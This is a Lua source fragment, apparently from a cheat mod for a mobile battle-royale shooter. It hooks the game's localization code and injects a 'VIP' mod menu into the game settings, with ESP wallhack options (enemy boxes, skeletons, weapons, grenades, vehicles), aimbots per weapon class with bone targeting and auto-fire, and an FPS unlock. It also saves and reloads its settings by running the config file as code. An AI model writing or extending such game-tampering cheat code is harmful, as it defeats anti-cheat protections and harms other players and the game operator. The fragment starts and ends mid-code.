            if file then
                file:write(data)
                file:close()
                break
            end
        end
    end)
end

-- LOAD CONFIG: saved features game restart par khud ON ho jaate hain
_G.LoadModSettings = function()
    pcall(function()
        local paths = GetConfigPaths(ConfigFileName)
        local content = nil
        for _, path in ipairs(paths) do
            local file = io.open(path, "r")
            if file then
                content = file:read("*a")
                file:close()
                if content and #content > 0 then break end
                content = nil
            end
        end

        local cfgRaw = _G.GTLMODConfigRaw or _G.GTLMODConfig
        local colRaw = _G.ColorConfigRaw or _G.ColorConfig

        -- CustomTextData: pehle defaults, phir saved values upar se
        local ctd = _G.GTLMODState.CustomTextData or {}
        for k, v in pairs(CTD_DEFAULTS) do if ctd[k] == nil then ctd[k] = v end end
        _G.GTLMODState.CustomTextData = ctd

        if content then
            local func = load(content)
            if func then
                local okRun, savedData = pcall(func)
                if okRun and type(savedData) == "table" then
                    local savedCfg = savedData.GTLMODConfig or savedData.GTLConfig
                    if type(savedCfg) == "table" then
                        for k, v in pairs(savedCfg) do cfgRaw[k] = v end
                    end
                    if type(savedData.CustomTextData) == "table" then
                        for k, v in pairs(savedData.CustomTextData) do ctd[k] = v end
                    end
                    if type(savedData.ColorConfig) == "table" then
                        for k, v in pairs(savedData.ColorConfig) do colRaw[k] = v end
                    end
                end
            end
        end

        -- One-time migration: ESP COUNTER V2 default ON
        if (tonumber(cfgRaw.SettingsVer) or 0) < 2 then
            cfgRaw.Esp9_Count = true
            cfgRaw.SettingsVer = 2
        end
        _G.SaveModSettings()
    end)
end

-- DIRTY FLAG: config change hone par save (proxy set hone par flag). Raw tables alag rakhe hain
-- taake pairs() se save sahi chale.
_G.GTLMODConfigDirty = false
if not _G.GTLMODConfigRaw then
    local raw = _G.GTLMODConfig
    _G.GTLMODConfigRaw = raw
    _G.GTLMODConfig = setmetatable({}, {
        __index = raw,
        __newindex = function(t, k, v)
            if raw[k] ~= v then _G.GTLMODConfigDirty = true end
            raw[k] = v
        end
    })
end
if not _G.ColorConfigRaw then
    local rawC = _G.ColorConfig
    _G.ColorConfigRaw = rawC
    _G.ColorConfig = setmetatable({}, {
        __index = rawC,
        __newindex = function(t, k, v)
            if rawC[k] ~= v then _G.GTLMODConfigDirty = true end
            rawC[k] = v
        end
    })
end

-- AUTO-SAVE LOOP: dirty hone par turant, warna har ~15s ek baar check (CustomTextData sliders ke liye).
-- SaveModSettings ke andar same-string guard hai, to file tabhi likhti hai jab sach mein kuch badla ho.
local _autoSaveTick = 0
local function AutoSaveLoop()
    _autoSaveTick = _autoSaveTick + 1
    if _G.GTLMODConfigDirty or (_autoSaveTick % 5 == 0) then
        _G.GTLMODConfigDirty = false
        pcall(function() if _G.SaveModSettings then _G.SaveModSettings() end end)
    end
    local ticker = GetTicker()
    if ticker and ticker.AddTimerOnce then
        ticker.AddTimerOnce(3.0, AutoSaveLoop)
    end
end

-- FIRST LAUNCH
if not _G.ModConfigLoaded then
    _G.LoadModSettings()
    AutoSaveLoop()
    _G.ModConfigLoaded = true
end

-- Force save on live config read
_G.ReadLiveConfig = function()
    if _G.SaveModSettings then _G.SaveModSettings() end
end

-- ========================================== 
-- VIP NATIVE MENU SYSTEM (RUNS DIRECTLY FROM GAME SETTINGS)
-- ========================================== 

function _G.InitModMenuTab()
    if _G.ModMenuInitialized then return end
    _G.ModMenuInitialized = true

    _G.GTLMODState.CustomTextData = _G.GTLMODState.CustomTextData or {
        OuterSpeed = 10, InnerSpeed = 10, OuterRecoil = 0, HRecoil = 0.3, VRecoil = 0.3, IpadViewFOV = 120,
        AimTouchHipPrio  = 1, AimTouchHipBone = 1, AimTouchHipCond = 1,
        AimTouchHipSpeed = 50, AimTouchHipFOV = 30, AimTouchHipDist = 250,
        AimTouchSGPrio  = 1, AimTouchSGBone = 2, AimTouchSGCond = 1,
        AimTouchSGSpeed = 80, AimTouchSGFOV = 40, AimTouchSGDist = 30,
        AimTouchScopePrio  = 1, AimTouchScopeBone = 2, AimTouchScopeCond = 1,
        AimTouchScopeSpeed = 40, AimTouchScopeFOV = 20, AimTouchScopeDist = 300,
        AimTouchScopePred  = 0, AimTouchScopeRecoil = 0,
        AimTouchSniperPrio  = 1, AimTouchSniperBone = 1, AimTouchSniperCond = 2,
        AimTouchSniperSpeed = 30, AimTouchSniperFOV = 20, AimTouchSniperDist = 400,
        AimTouchSniperPred  = 0,
    }

    local LocUtil = _G.LocUtil
    if not LocUtil and package.loaded["client.common.LocUtil"] then
        LocUtil = require("client.common.LocUtil")
    end
    
    if LocUtil and not LocUtil._IsModMenuHooked then
        local old_get = LocUtil.GetLocalizeResStr
        LocUtil.GetLocalizeResStr = function(id)
            if type(id) == "string" and not tonumber(id) then
                return id
            end
            return old_get(id)
        end
        LocUtil._IsModMenuHooked = true
    end

    local SettingPageDefine = require("client.logic.NewSetting.SettingPageDefine")
    local SettingCatalog = require("client.logic.NewSetting.SettingCatalog")
    
    if not SettingPageDefine.ModMenu then
        local AliasMap = require("client.slua.umg.NewSetting.Item.AliasMap")
        
        -- ==================== ESP VISUAL ====================
        local StackESPVisual = {
            { Key = "ModMenu_ESP1", UI = AliasMap.Switcher, Text = "PREMIUM ALL FEATURES ON", GetFunc = function() return _G.GTLMODConfig.EspVip end,
              SetFunc = function(c,v)
                _G.GTLMODConfig.EspVip = v
                _G.GTLMODConfig.Esp9_Line = v and true or false
                _G.GTLMODConfig.Esp9_HP   = v and true or false
                return true
              end },
            { Key = "ModMenu_ESPCounter", UI = AliasMap.Switcher, Text = "ESP COUNTER V2", GetFunc = function() return _G.GTLMODConfig.Esp9_Count end, SetFunc = function(c,v) _G.GTLMODConfig.Esp9_Count = v return true end },
            { Key = "ModMenu_ESP4", UI = AliasMap.Switcher, Text = "ESP MARK - 360 Radar", GetFunc = function() return _G.GTLMODConfig.EspRadar end, SetFunc = function(c,v) _G.GTLMODConfig.EspRadar = v return true end },
            { Key = "ModMenu_ESP5", UI = AliasMap.Switcher, Text = "ESP BOX FRAME", GetFunc = function() return _G.GTLMODConfig.Esp5 end, SetFunc = function(c,v) _G.GTLMODConfig.Esp5 = v return true end },
            { Key = "ModMenu_ESPAntenna", UI = AliasMap.Switcher, Text = "ESP LINE ANTENA", GetFunc = function() return _G.GTLMODConfig.EspAntenna end, SetFunc = function(c,v) _G.GTLMODConfig.EspAntenna = v return true end },
            { Key = "ModMenu_ESP6", UI = AliasMap.Switcher, Text = "SKELETON ESP", GetFunc = function() return _G.GTLMODConfig.Esp6 end, SetFunc = function(c,v) _G.GTLMODConfig.Esp6 = v return true end },
            { Key = "ModMenu_ESPWeapon", UI = AliasMap.Switcher, Text = "SHOW ENEMY WEAPON", GetFunc = function() return _G.GTLMODConfig.EspWeapon end, SetFunc = function(c,v) _G.GTLMODConfig.EspWeapon = v return true end },
            { Key = "ModMenu_ESPName", UI = AliasMap.Switcher, Text = "ESP NAME TEST(VISIBLE)", GetFunc = function() return _G.GTLMODConfig.EspName end, SetFunc = function(c,v) _G.GTLMODConfig.EspName = v return true end },
            { Key = "ModMenu_ESPBom_Ex", UI = AliasMap.TitleSwitcher, Text = "\226\150\182 GRANDE WARNING ESP", ExpandIndex = 0, GetFunc = function() return _G.GTLMODConfig.EspBomMaster end, SetFunc = function(c,v) _G.GTLMODConfig.EspBomMaster = v return true end },
            { Key = "ModMenu_ESPItemBom", UI = AliasMap.Switcher, Text = "   Locate Grenades on the Ground", ExpandHandle = "ModMenu_ESPBom_Ex", GetFunc = function() return _G.GTLMODConfig.EspItemBom end, SetFunc = function(c,v) _G.GTLMODConfig.EspItemBom = v return true end },
            { Key = "ModMenu_ESPActiveBom", UI = AliasMap.Switcher, Text = "   Warn when Enemy Holds or Throws", ExpandHandle = "ModMenu_ESPBom_Ex", GetFunc = function() return _G.GTLMODConfig.EspActiveBom end, SetFunc = function(c,v) _G.GTLMODConfig.EspActiveBom = v return true end },
            { Key = "ModMenu_ESPVehicle_Ex", UI = AliasMap.TitleSwitcher, Text = "\226\150\182 VEHICLE ESP", ExpandIndex = 0, GetFunc = function() return _G.GTLMODConfig.EspVehicle end, SetFunc = function(c,v) _G.GTLMODConfig.EspVehicle = v return true end },
            { Key = "ModMenu_ESPVeh_Dacia", UI = AliasMap.Switcher, Text = "   Show Dacia", ExpandHandle = "ModMenu_ESPVehicle_Ex", GetFunc = function() return _G.GTLMODConfig.EspVeh_Dacia end, SetFunc = function(c,v) _G.GTLMODConfig.EspVeh_Dacia = v return true end },
            { Key = "ModMenu_ESPVeh_UAZ", UI = AliasMap.Switcher, Text = "   Show UAZ", ExpandHandle = "ModMenu_ESPVehicle_Ex", GetFunc = function() return _G.GTLMODConfig.EspVeh_UAZ end, SetFunc = function(c,v) _G.GTLMODConfig.EspVeh_UAZ = v return true end },
            { Key = "ModMenu_ESPVeh_Buggy", UI = AliasMap.Switcher, Text = "   Show Buggy", ExpandHandle = "ModMenu_ESPVehicle_Ex", GetFunc = function() return _G.GTLMODConfig.EspVeh_Buggy end, SetFunc = function(c,v) _G.GTLMODConfig.EspVeh_Buggy = v return true end },
            { Key = "ModMenu_ESPVeh_Coupe", UI = AliasMap.Switcher, Text = "   Show Coupe RB", ExpandHandle = "ModMenu_ESPVehicle_Ex", GetFunc = function() return _G.GTLMODConfig.EspVeh_Coupe end, SetFunc = function(c,v) _G.GTLMODConfig.EspVeh_Coupe = v return true end },
            { Key = "ModMenu_ESPVeh_Mirado", UI = AliasMap.Switcher, Text = "   Show Mirado", ExpandHandle = "ModMenu_ESPVehicle_Ex", GetFunc = function() return _G.GTLMODConfig.EspVeh_Mirado end, SetFunc = function(c,v) _G.GTLMODConfig.EspVeh_Mirado = v return true end },
            { Key = "ModMenu_ESPVeh_Motor", UI = AliasMap.Switcher, Text = "   Show Motor / Scooter", ExpandHandle = "ModMenu_ESPVehicle_Ex", GetFunc = function() return _G.GTLMODConfig.EspVeh_Motor end, SetFunc = function(c,v) _G.GTLMODConfig.EspVeh_Motor = v return true end },
            { Key = "ModMenu_ESPVeh_Other", UI = AliasMap.Switcher, Text = "   Show Other Vehicles", ExpandHandle = "ModMenu_ESPVehicle_Ex", GetFunc = function() return _G.GTLMODConfig.EspVeh_Other end, SetFunc = function(c,v) _G.GTLMODConfig.EspVeh_Other = v return true end },
            { Key = "ModMenu_ESPOutline_Ex", UI = AliasMap.TitleSwitcher, Text = "▶ ESP OUTLINE", ExpandIndex = 0, GetFunc = function() return _G.GTLMODConfig.EspOutline end, SetFunc = function(c,v) _G.GTLMODConfig.EspOutline = v return true end },
            { Key = "ModMenu_ESPOutline_Thickness", UI = AliasMap.Slider, Text = "   Outline Thickness (1% is perfect)", ExpandHandle = "ModMenu_ESPOutline_Ex", MinValue = 1, MaxValue = 20, min = 1, max = 20, GetFunc = function() return _G.GTLMODConfig.OutlineThickness end, SetFunc = function(c,v) _G.GTLMODConfig.OutlineThickness = v return true end }
        }

        -- ==================== AIMBOT ====================
        local StackAimbotForce = {
            { Key = "ModMenu_AT_Master", UI = AliasMap.Switcher, Text = "AIMBOT MASTER SWITCH",
              GetFunc = function() return _G.GTLMODConfig.AimTouchEnable end,
              SetFunc = function(c,v) _G.GTLMODConfig.AimTouchEnable = v return true end },

            -- HIPFIRE
            { Key = "ModMenu_AT_Hip_Ex", UI = AliasMap.TitleSwitcher, Text = "▶ Hipfire Aimbot", ExpandIndex = 0,
              GetFunc = function() return _G.GTLMODConfig.AimTouchHipfire end,
              SetFunc = function(c,v) _G.GTLMODConfig.AimTouchHipfire = v return true end },
            { Key = "ModMenu_AT_Hip_IgKnock", UI = AliasMap.Switcher, Text = "   Ignore Knocked", ExpandHandle = "ModMenu_AT_Hip_Ex",
              GetFunc = function() return _G.GTLMODConfig.AimTouchHipIgKnock end,
              SetFunc = function(c,v) _G.GTLMODConfig.AimTouchHipIgKnock = v return true end },
            { Key = "ModMenu_AT_Hip_IgBot", UI = AliasMap.Switcher, Text = "   Ignore Bots", ExpandHandle = "ModMenu_AT_Hip_Ex",
              GetFunc = function() return _G.GTLMODConfig.AimTouchHipIgBot end,
              SetFunc = function(c,v) _G.GTLMODConfig.AimTouchHipIgBot = v return true end },
            { Key = "ModMenu_AT_Hip_Vis", UI = AliasMap.Switcher, Text = "   Visibility Check", ExpandHandle = "ModMenu_AT_Hip_Ex",
              GetFunc = function() return _G.GTLMODConfig.AimTouchHipVisCheck end,
              SetFunc = function(c,v) _G.GTLMODConfig.AimTouchHipVisCheck = v return true end },
            { Key = "ModMenu_AT_Hip_Prio", UI = AliasMap.Slider, Text = "   Priority (1:Center 2:Dist 3:HP 4:HP%)", ExpandHandle = "ModMenu_AT_Hip_Ex",
              MinValue = 1, MaxValue = 4, min = 1, max = 4,
              GetFunc = function() return _G.GTLMODState.CustomTextData.AimTouchHipPrio or 1 end,
              SetFunc = function(c,v) local n = math.floor(v+0.5); if n<1 then n=1 elseif n>4 then n=4 end _G.GTLMODState.CustomTextData.AimTouchHipPrio = n return true end },
            { Key = "ModMenu_AT_Hip_Bone", UI = AliasMap.Slider, Text = "   Bone (1:Head 2:Chest 3:Stomach 4:Pelvis)", ExpandHandle = "ModMenu_AT_Hip_Ex",
              MinValue = 1, MaxValue = 4, min = 1, max = 4,
              GetFunc = function() return _G.GTLMODState.CustomTextData.AimTouchHipBone or 1 end,
              SetFunc = function(c,v) local n = math.floor(v+0.5); if n<1 then n=1 elseif n>4 then n=4 end _G.GTLMODState.CustomTextData.AimTouchHipBone = n return true end },
            { Key = "ModMenu_AT_Hip_Cond", UI = AliasMap.Slider, Text = "   Condition (1:Aim on fire 2:Always)", ExpandHandle = "ModMenu_AT_Hip_Ex",
              MinValue = 1, MaxValue = 2, min = 1, max = 2,
              GetFunc = function() return _G.GTLMODState.CustomTextData.AimTouchHipCond or 1 end,
              SetFunc = function(c,v) local n = math.floor(v+0.5); if n<1 then n=1 elseif n>2 then n=2 end _G.GTLMODState.CustomTextData.AimTouchHipCond = n return true end },
            { Key = "ModMenu_AT_Hip_Spd", UI = AliasMap.Slider, Text = "   Speed", ExpandHandle = "ModMenu_AT_Hip_Ex",
              MinValue = 1, MaxValue = 100, min = 1, max = 100,
              GetFunc = function() return _G.GTLMODState.CustomTextData.AimTouchHipSpeed or 50 end,
              SetFunc = function(c,v) _G.GTLMODState.CustomTextData.AimTouchHipSpeed = v return true end },
            { Key = "ModMenu_AT_Hip_FOV", UI = AliasMap.Slider, Text = "   FOV", ExpandHandle = "ModMenu_AT_Hip_Ex",
              MinValue = 1, MaxValue = 100, min = 1, max = 100,
              GetFunc = function() return _G.GTLMODState.CustomTextData.AimTouchHipFOV or 30 end,
              SetFunc = function(c,v) _G.GTLMODState.CustomTextData.AimTouchHipFOV = v return true end },
            { Key = "ModMenu_AT_Hip_Dist", UI = AliasMap.Slider, Text = "   Distance (m/5)", ExpandHandle = "ModMenu_AT_Hip_Ex",
              MinValue = 1, MaxValue = 100, min = 1, max = 100,
              GetFunc = function() return math.floor((_G.GTLMODState.CustomTextData.AimTouchHipDist or 250) / 5) end,
              SetFunc = function(c,v) _G.GTLMODState.CustomTextData.AimTouchHipDist = v * 5 return true end },

            -- SCOPED (ALL WEAPONS)
            { Key = "ModMenu_AT_ScopeAll_Ex", UI = AliasMap.TitleSwitcher, Text = "▶ Scoped Aimbot (All Weapons)", ExpandIndex = 0,
              GetFunc = function() return _G.GTLMODConfig.AimTouchScopeAll end,
              SetFunc = function(c,v) _G.GTLMODConfig.AimTouchScopeAll = v return true end },
            { Key = "ModMenu_AT_ScopeAll_IgKnock", UI = AliasMap.Switcher, Text = "   Ignore Knocked", ExpandHandle = "ModMenu_AT_ScopeAll_Ex",
              GetFunc = function() return _G.GTLMODConfig.AimTouchScopeIgKnock end,
              SetFunc = function(c,v) _G.GTLMODConfig.AimTouchScopeIgKnock = v return true end },
            { Key = "ModMenu_AT_ScopeAll_IgBot", UI = AliasMap.Switcher, Text = "   Ignore Bots", ExpandHandle = "ModMenu_AT_ScopeAll_Ex",
              GetFunc = function() return _G.GTLMODConfig.AimTouchScopeIgBot end,
              SetFunc = function(c,v) _G.GTLMODConfig.AimTouchScopeIgBot = v return true end },
            { Key = "ModMenu_AT_ScopeAll_Vis", UI = AliasMap.Switcher, Text = "   Visibility Check", ExpandHandle = "ModMenu_AT_ScopeAll_Ex",
              GetFunc = function() return _G.GTLMODConfig.AimTouchScopeVisCheck end,
              SetFunc = function(c,v) _G.GTLMODConfig.AimTouchScopeVisCheck = v return true end },
            { Key = "ModMenu_AT_ScopeAll_Prio", UI = AliasMap.Slider, Text = "   Priority (1:Center 2:Dist 3:HP 4:HP%)", ExpandHandle = "ModMenu_AT_ScopeAll_Ex",
              MinValue = 1, MaxValue = 4, min = 1, max = 4,
              GetFunc = function() return _G.GTLMODState.CustomTextData.AimTouchScopePrio or 1 end,
              SetFunc = function(c,v) local n = math.floor(v+0.5); if n<1 then n=1 elseif n>4 then n=4 end _G.GTLMODState.CustomTextData.AimTouchScopePrio = n return true end },
            { Key = "ModMenu_AT_ScopeAll_Bone", UI = AliasMap.Slider, Text = "   Bone (1:Head 2:Chest 3:Stomach 4:Pelvis)", ExpandHandle = "ModMenu_AT_ScopeAll_Ex",
              MinValue = 1, MaxValue = 4, min = 1, max = 4,
              GetFunc = function() return _G.GTLMODState.CustomTextData.AimTouchScopeBone or 2 end,
              SetFunc = function(c,v) local n = math.floor(v+0.5); if n<1 then n=1 elseif n>4 then n=4 end _G.GTLMODState.CustomTextData.AimTouchScopeBone = n return true end },
            { Key = "ModMenu_AT_ScopeAll_Cond", UI = AliasMap.Slider, Text = "   Condition (1:Aim on fire 2:Always)", ExpandHandle = "ModMenu_AT_ScopeAll_Ex",
              MinValue = 1, MaxValue = 2, min = 1, max = 2,
              GetFunc = function() return _G.GTLMODState.CustomTextData.AimTouchScopeCond or 1 end,
              SetFunc = function(c,v) local n = math.floor(v+0.5); if n<1 then n=1 elseif n>2 then n=2 end _G.GTLMODState.CustomTextData.AimTouchScopeCond = n return true end },
            { Key = "ModMenu_AT_ScopeAll_Spd", UI = AliasMap.Slider, Text = "   Speed", ExpandHandle = "ModMenu_AT_ScopeAll_Ex",
              MinValue = 1, MaxValue = 100, min = 1, max = 100,
              GetFunc = function() return _G.GTLMODState.CustomTextData.AimTouchScopeSpeed or 40 end,
              SetFunc = function(c,v) _G.GTLMODState.CustomTextData.AimTouchScopeSpeed = v return true end },
            { Key = "ModMenu_AT_ScopeAll_FOV", UI = AliasMap.Slider, Text = "   FOV", ExpandHandle = "ModMenu_AT_ScopeAll_Ex",
              MinValue = 1, MaxValue = 100, min = 1, max = 100,
              GetFunc = function() return _G.GTLMODState.CustomTextData.AimTouchScopeFOV or 20 end,
              SetFunc = function(c,v) _G.GTLMODState.CustomTextData.AimTouchScopeFOV = v return true end },
            { Key = "ModMenu_AT_ScopeAll_Dist", UI = AliasMap.Slider, Text = "   Distance (m/5)", ExpandHandle = "ModMenu_AT_ScopeAll_Ex",
              MinValue = 1, MaxValue = 100, min = 1, max = 100,
              GetFunc = function() return math.floor((_G.GTLMODState.CustomTextData.AimTouchScopeDist or 300) / 5) end,
              SetFunc = function(c,v) _G.GTLMODState.CustomTextData.AimTouchScopeDist = v * 5 return true end },
            { Key = "ModMenu_AT_ScopeAll_Pred", UI = AliasMap.Slider, Text = "   Prediction", ExpandHandle = "ModMenu_AT_ScopeAll_Ex",
              MinValue = 0, MaxValue = 100, min = 0, max = 100,
              GetFunc = function() return _G.GTLMODState.CustomTextData.AimTouchScopePred or 0 end,
              SetFunc = function(c,v) _G.GTLMODState.CustomTextData.AimTouchScopePred = v return true end },
            { Key = "ModMenu_AT_ScopeAll_Recoil", UI = AliasMap.Slider, Text = "   Recoil Comp", ExpandHandle = "ModMenu_AT_ScopeAll_Ex",
              MinValue = 0, MaxValue = 50, min = 0, max = 50,
              GetFunc = function() return _G.GTLMODState.CustomTextData.AimTouchScopeRecoil or 0 end,
              SetFunc = function(c,v) _G.GTLMODState.CustomTextData.AimTouchScopeRecoil = v return true end },

            -- SHOTGUN
            { Key = "ModMenu_AT_SG_Ex", UI = AliasMap.TitleSwitcher, Text = "▶ Shotgun Aimbot", ExpandIndex = 0,
              GetFunc = function() return _G.GTLMODConfig.AimTouchSG end,
              SetFunc = function(c,v) _G.GTLMODConfig.AimTouchSG = v return true end },
            { Key = "ModMenu_AT_SG_AutoFire", UI = AliasMap.Switcher, Text = "   Auto Fire", ExpandHandle = "ModMenu_AT_SG_Ex",
              GetFunc = function() return _G.GTLMODConfig.AimTouchSGAutoFire end,
              SetFunc = function(c,v) _G.GTLMODConfig.AimTouchSGAutoFire = v return true end },
            { Key = "ModMenu_AT_SG_IgKnock", UI = AliasMap.Switcher, Text = "   Ignore Knocked", ExpandHandle = "ModMenu_AT_SG_Ex",
              GetFunc = function() return _G.GTLMODConfig.AimTouchSGIgKnock end,
              SetFunc = function(c,v) _G.GTLMODConfig.AimTouchSGIgKnock = v return true end },
            { Key = "ModMenu_AT_SG_IgBot", UI = AliasMap.Switcher, Text = "   Ignore Bots", ExpandHandle = "ModMenu_AT_SG_Ex",
              GetFunc = function() return _G.GTLMODConfig.AimTouchSGIgBot end,
              SetFunc = function(c,v) _G.GTLMODConfig.AimTouchSGIgBot = v return true end },
            { Key = "ModMenu_AT_SG_Vis", UI = AliasMap.Switcher, Text = "   Visibility Check", ExpandHandle = "ModMenu_AT_SG_Ex",
              GetFunc = function() return _G.GTLMODConfig.AimTouchSGVisCheck end,
              SetFunc = function(c,v) _G.GTLMODConfig.AimTouchSGVisCheck = v return true end },
            { Key = "ModMenu_AT_SG_Prio", UI = AliasMap.Slider, Text = "   Priority (1:Center 2:Dist 3:HP 4:HP%)", ExpandHandle = "ModMenu_AT_SG_Ex",
              MinValue = 1, MaxValue = 4, min = 1, max = 4,
              GetFunc = function() return _G.GTLMODState.CustomTextData.AimTouchSGPrio or 1 end,
              SetFunc = function(c,v) local n = math.floor(v+0.5); if n<1 then n=1 elseif n>4 then n=4 end _G.GTLMODState.CustomTextData.AimTouchSGPrio = n return true end },
            { Key = "ModMenu_AT_SG_Bone", UI = AliasMap.Slider, Text = "   Bone (1:Head 2:Chest 3:Stomach 4:Pelvis)", ExpandHandle = "ModMenu_AT_SG_Ex",
              MinValue = 1, MaxValue = 4, min = 1, max = 4,
              GetFunc = function() return _G.GTLMODState.CustomTextData.AimTouchSGBone or 2 end,
              SetFunc = function(c,v) local n = math.floor(v+0.5); if n<1 then n=1 elseif n>4 then n=4 end _G.GTLMODState.CustomTextData.AimTouchSGBone = n return true end },
            { Key = "ModMenu_AT_SG_Cond", UI = AliasMap.Slider, Text = "   Condition (1:Aim on fire 2:Always)", ExpandHandle = "ModMenu_AT_SG_Ex",
              MinValue = 1, MaxValue = 2, min = 1, max = 2,
              GetFunc = function() return _G.GTLMODState.CustomTextData.AimTouchSGCond or 1 end,
              SetFunc = function(c,v) local n = math.floor(v+0.5); if n<1 then n=1 elseif n>2 then n=2 end _G.GTLMODState.CustomTextData.AimTouchSGCond = n return true end },
            { Key = "ModMenu_AT_SG_Spd", UI = AliasMap.Slider, Text = "   Speed", ExpandHandle = "ModMenu_AT_SG_Ex",
              MinValue = 1, MaxValue = 100, min = 1, max = 100,
              GetFunc = function() return _G.GTLMODState.CustomTextData.AimTouchSGSpeed or 80 end,
              SetFunc = function(c,v) _G.GTLMODState.CustomTextData.AimTouchSGSpeed = v return true end },
            { Key = "ModMenu_AT_SG_FOV", UI = AliasMap.Slider, Text = "   FOV", ExpandHandle = "ModMenu_AT_SG_Ex",
              MinValue = 1, MaxValue = 100, min = 1, max = 100,
              GetFunc = function() return _G.GTLMODState.CustomTextData.AimTouchSGFOV or 40 end,
              SetFunc = function(c,v) _G.GTLMODState.CustomTextData.AimTouchSGFOV = v return true end },
            { Key = "ModMenu_AT_SG_Dist", UI = AliasMap.Slider, Text = "   Distance (m)", ExpandHandle = "ModMenu_AT_SG_Ex",
              MinValue = 1, MaxValue = 100, min = 1, max = 100,
              GetFunc = function() return _G.GTLMODState.CustomTextData.AimTouchSGDist or 30 end,
              SetFunc = function(c,v) _G.GTLMODState.CustomTextData.AimTouchSGDist = v return true end },

            -- SNIPER
            { Key = "ModMenu_AT_Sniper_Ex", UI = AliasMap.TitleSwitcher, Text = "▶ Scoped Aimbot (Snipers)", ExpandIndex = 0,
              GetFunc = function() return _G.GTLMODConfig.AimTouchScopeSniper end,
              SetFunc = function(c,v) _G.GTLMODConfig.AimTouchScopeSniper = v return true end },
            { Key = "ModMenu_AT_Sniper_IgKnock", UI = AliasMap.Switcher, Text = "   Ignore Knocked", ExpandHandle = "ModMenu_AT_Sniper_Ex",
              GetFunc = function() return _G.GTLMODConfig.AimTouchSniperIgKnock end,
              SetFunc = function(c,v) _G.GTLMODConfig.AimTouchSniperIgKnock = v return true end },
            { Key = "ModMenu_AT_Sniper_IgBot", UI = AliasMap.Switcher, Text = "   Ignore Bots", ExpandHandle = "ModMenu_AT_Sniper_Ex",
              GetFunc = function() return _G.GTLMODConfig.AimTouchSniperIgBot end,
              SetFunc = function(c,v) _G.GTLMODConfig.AimTouchSniperIgBot = v return true end },
            { Key = "ModMenu_AT_Sniper_Vis", UI = AliasMap.Switcher, Text = "   Visibility Check", ExpandHandle = "ModMenu_AT_Sniper_Ex",
              GetFunc = function() return _G.GTLMODConfig.AimTouchSniperVisCheck end,
              SetFunc = function(c,v) _G.GTLMODConfig.AimTouchSniperVisCheck = v return true end },
            { Key = "ModMenu_AT_Sniper_Prio", UI = AliasMap.Slider, Text = "   Priority (1:Center 2:Dist 3:HP 4:HP%)", ExpandHandle = "ModMenu_AT_Sniper_Ex",
              MinValue = 1, MaxValue = 4, min = 1, max = 4,
              GetFunc = function() return _G.GTLMODState.CustomTextData.AimTouchSniperPrio or 1 end,
              SetFunc = function(c,v) local n = math.floor(v+0.5); if n<1 then n=1 elseif n>4 then n=4 end _G.GTLMODState.CustomTextData.AimTouchSniperPrio = n return true end },
            { Key = "ModMenu_AT_Sniper_Bone", UI = AliasMap.Slider, Text = "   Bone (1:Head 2:Chest 3:Stomach 4:Pelvis)", ExpandHandle = "ModMenu_AT_Sniper_Ex",
              MinValue = 1, MaxValue = 4, min = 1, max = 4,
              GetFunc = function() return _G.GTLMODState.CustomTextData.AimTouchSniperBone or 1 end,
              SetFunc = function(c,v) local n = math.floor(v+0.5); if n<1 then n=1 elseif n>4 then n=4 end _G.GTLMODState.CustomTextData.AimTouchSniperBone = n return true end },
            { Key = "ModMenu_AT_Sniper_Cond", UI = AliasMap.Slider, Text = "   Condition (1:Aim on fire 2:Always)", ExpandHandle = "ModMenu_AT_Sniper_Ex",
              MinValue = 1, MaxValue = 2, min = 1, max = 2,
              GetFunc = function() return _G.GTLMODState.CustomTextData.AimTouchSniperCond or 2 end,
              SetFunc = function(c,v) local n = math.floor(v+0.5); if n<1 then n=1 elseif n>2 then n=2 end _G.GTLMODState.CustomTextData.AimTouchSniperCond = n return true end },
            { Key = "ModMenu_AT_Sniper_Spd", UI = AliasMap.Slider, Text = "   Speed", ExpandHandle = "ModMenu_AT_Sniper_Ex",
              MinValue = 1, MaxValue = 100, min = 1, max = 100,
              GetFunc = function() return _G.GTLMODState.CustomTextData.AimTouchSniperSpeed or 30 end,
              SetFunc = function(c,v) _G.GTLMODState.CustomTextData.AimTouchSniperSpeed = v return true end },
            { Key = "ModMenu_AT_Sniper_FOV", UI = AliasMap.Slider, Text = "   FOV", ExpandHandle = "ModMenu_AT_Sniper_Ex",
              MinValue = 1, MaxValue = 100, min = 1, max = 100,
              GetFunc = function() return _G.GTLMODState.CustomTextData.AimTouchSniperFOV or 20 end,
              SetFunc = function(c,v) _G.GTLMODState.CustomTextData.AimTouchSniperFOV = v return true end },
            { Key = "ModMenu_AT_Sniper_Dist", UI = AliasMap.Slider, Text = "   Distance (m/5)", ExpandHandle = "ModMenu_AT_Sniper_Ex",
              MinValue = 1, MaxValue = 100, min = 1, max = 100,
              GetFunc = function() return math.floor((_G.GTLMODState.CustomTextData.AimTouchSniperDist or 400) / 5) end,
              SetFunc = function(c,v) _G.GTLMODState.CustomTextData.AimTouchSniperDist = v * 5 return true end },
            { Key = "ModMenu_AT_Sniper_Pred", UI = AliasMap.Slider, Text = "   Prediction", ExpandHandle = "ModMenu_AT_Sniper_Ex",
              MinValue = 0, MaxValue = 100, min = 0, max = 100,
              GetFunc = function() return _G.GTLMODState.CustomTextData.AimTouchSniperPred or 0 end,
              SetFunc = function(c,v) _G.GTLMODState.CustomTextData.AimTouchSniperPred = v return true end },
        }

        local StackMagicBullet = {}

        -- ==================== COMBAT GRAPHIC ====================
        local StackCombatGraphic = {
            { Key = "ModMenu_Ipad_Ex", UI = AliasMap.TitleSwitcher, Text = "▶ iPad View (Tampilan iPad)", ExpandIndex = 0, GetFunc = function() return _G.GTLMODConfig.IpadView end, SetFunc = function(c,v) _G.GTLMODConfig.IpadView = v return true end },
            { Key = "ModMenu_Ipad_FOV", UI = AliasMap.Slider, Text = "   FOV Angle (Sudut Pandang)", ExpandHandle = "ModMenu_Ipad_Ex", MinValue = 1, MaxValue = 100, min = 1, max = 100, GetFunc = function() return (_G.GTLMODState.CustomTextData.IpadViewFOV or 120) - 80 end, SetFunc = function(c,v) _G.GTLMODState.CustomTextData.IpadViewFOV = 80 + v return true end },
            { Key = "ModMenu_165FPS", UI = AliasMap.Switcher, Text = "165 FPS", GetFunc = function() return _G.GTLMODConfig.UnlockFPS end, SetFunc = function(c,v) _G.GTLMODConfig.UnlockFPS = v; if v then _G.GTLMODState.GraphicsUnlocked = false end return true end },
